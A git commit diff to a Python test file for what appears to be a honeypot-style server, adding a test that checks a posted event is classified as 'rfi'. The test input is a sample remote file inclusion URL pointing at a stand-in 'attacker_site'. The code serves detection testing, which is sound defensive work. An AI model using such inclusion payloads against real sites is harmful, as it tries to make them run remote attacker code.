b5dec29a23b2f2de157163a577d064b6a1cef73d
Evgeniya Tokarchuk <Evgeniya Tokarchuk>
2016-05-24 15:13:36 +0500

    test rfi detection response

--- tests/test_server.py
+++ tests/test_server.py
@@ -6,8 +6,10 @@ from unittest import mock
 
 
 class TestServer(unittest.TestCase):
-
     MockedRequestHandler = None
+    srv = None
+    m = None
+    m_eof = None
 
     def setUp(self):
         with mock.patch('builtins.open', mock.mock_open(), create=True):
@@ -15,27 +17,59 @@ class TestServer(unittest.TestCase):
                 import server
                 self.MockedRequestHandler = server.HttpRequestHandler
 
+        self.srv = self.MockedRequestHandler(debug=False, keep_alive=75)
+        self.srv.writer = mock.Mock()
+
+        self.m = mock.Mock()
+        self.m_eof = mock.Mock()
+        self.m_eof.return_value = (lambda: (yield None))()
+
     def test_handle_request_for_dorks(self):
-        srv = self.MockedRequestHandler(debug=False, keep_alive=75)
-        srv.writer = mock.Mock()
-        m = mock.Mock()
-        m_eof = mock.Mock()
-        m_eof.return_value = (lambda: (yield None))()
         rand = mock.Mock()
         rand.return_value = [x for x in range(10)]
 
-        with mock.patch('aiohttp.Response.write', m, create=True):
-            with mock.patch('aiohttp.Response.write_eof', m_eof, create=True):
+        with mock.patch('aiohttp.Response.write', self.m, create=True):
+            with mock.patch('aiohttp.Response.write_eof', self.m_eof, create=True):
                 with mock.patch('random.sample', rand, create=True):
                     message = mock.Mock()
                     message.headers = []
                     message.path = '/dorks'
                     message.version = (1, 1)
 
-                    asyncio.get_event_loop().run_until_complete(srv.handle_request(message, None))
+                    asyncio.get_event_loop().run_until_complete(self.srv.handle_request(message, None))
 
-                    content = b''.join([c[1][0] for c in list(m.mock_calls)]).decode('utf-8')
+                    content = b''.join([c[1][0] for c in list(self.m.mock_calls)]).decode('utf-8')
                     content = json.loads(content)
-                    assert_content = dict(version=1, response=dict(dorks=[x for x in range(10)]))
+                assert_content = dict(version=1, response=dict(dorks=[x for x in range(10)]))
 
-                    self.assertDictEqual(content, assert_content)
+                self.assertDictEqual(content, assert_content)
+
+    def test_hadle_request_rfi(self):
+        rand = mock.Mock()
+        rand.return_value = [x for x in range(10)]
+
+        with mock.patch('aiohttp.Response.write', self.m, create=True):
+            with mock.patch('aiohttp.Response.write_eof', self.m_eof, create=True):
+                message = mock.Mock()
+                message.headers = []
+                message.path = '/event'
+                message.version = (1, 1)
+
+                @asyncio.coroutine
+                def foobar():
+                    return b'{"path":"http://vulnerable_host/vuln_page.php?file=http://attacker_site/malicous_page"}'
+
+                payload = mock.Mock()
+                payload.read = foobar
+
+                asyncio.get_event_loop().run_until_complete(self.srv.handle_request(message, payload))
+
+                content = b''.join([c[1][0] for c in list(self.m.mock_calls)]).decode('utf-8')
+                content = json.loads(content)
+
+                assert_content = dict(
+                    version=1,
+                    response=dict(message=dict(detection=dict(name='rfi', order=2)))
+                )
+
+                self.assertDictEqual(content, assert_content)
